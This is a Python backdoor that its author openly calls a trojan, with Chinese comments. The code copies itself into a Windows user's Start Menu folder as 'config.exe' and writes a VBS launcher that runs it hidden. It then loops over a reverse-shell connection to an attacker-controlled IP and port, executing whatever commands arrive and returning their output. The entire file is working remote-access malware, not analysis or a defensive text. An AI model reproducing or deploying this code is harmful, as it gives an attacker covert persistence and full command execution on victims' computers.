import socket
import os
import time
import shutil
#检测路径是否存在
#我的pyhton木马1.0版本 问题和毛病有很多  欢迎联系我交流: wx：heihuang404
def search_user():
    file_dir=os.listdir("c:\\Users")
    #被排除的路径
    path=['All Users', 'Default', 'Default User', 'DefaultAppPool', 'defaultuser100000', 'desktop.ini', 'Public']
    for i in range(0,len(file_dir)):
        if file_dir[i] not in path :
            c=os.listdir('c:\\Users\\'+file_dir[i])
            for j in range(0,len(c)):
                #用于标识
                if c[j] != 'MicrosoftEdgeBackups':
                    continue
                else:
                    return file_dir[i].encode('utf-8')

file_dir="C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" #Startup\\
if "config.exe" not in os.listdir(file_dir):
    #自我复制
    shutil.copy('backdor.exe', file_dir+'config.exe')
    #自我复制
    # with open("BackDor.exe", 'rb') as rstream:
    #     conn = rstream.read()
    #     with open(file_dir + 'config.exe', 'wb') as wstream:
    #         wstream.write(conn)
    #     wstream.close()
    # rstream.close()
    #创建vbs文件
    vbs_file=open("C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System.vbs",'w')
    vbs_file.write('Set ws = createObject("WScript.shell")\nws.run "cmd /c config.exe",vbhide')
    vbs_file.close()
    #切换目录并打开vbs文件
    os.chdir("C:\\Users\\"+search_user().decode('utf-8')+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\")
    os.system(".\System.vbs")
    exit()
elif "Microsoft.vbs" not in os.listdir(file_dir):
    #让自己能定时启动
    pass
conn=1
#循环等待被链接
while 1:
    hacker = "127.0.0.1" #公网/隧道 ip
    port = 50000 #公网/隧道 端口
    server = (hacker, port)
    s = socket.socket()
    s.connect(server)

    while 1:
        # 得到被攻击端的所在目录，并发送
        dir = os.getcwd()+':'
        #print(dir)
        try:
            s.send(dir.encode())
        except ConnectionAbortedError:
            break
        # 接收来自攻击端(服务器端)的命令，并进行处理
        cmd = s.recv(1024).decode()
        # 对接收的命令做出判断
        # 退出
        if cmd == "exit":
            conn=0
            break
        elif cmd.startswith("cd"):
            os.chdir(cmd[2:].strip())
            result = "切换目录成功!"
        else:
            result = os.popen(cmd).read()
        if not result:
            result = "命令执行完毕!"

        s.send(result.encode())
        time.sleep(1)

    s.close()
    if conn==0:
        break
    time.sleep(10)
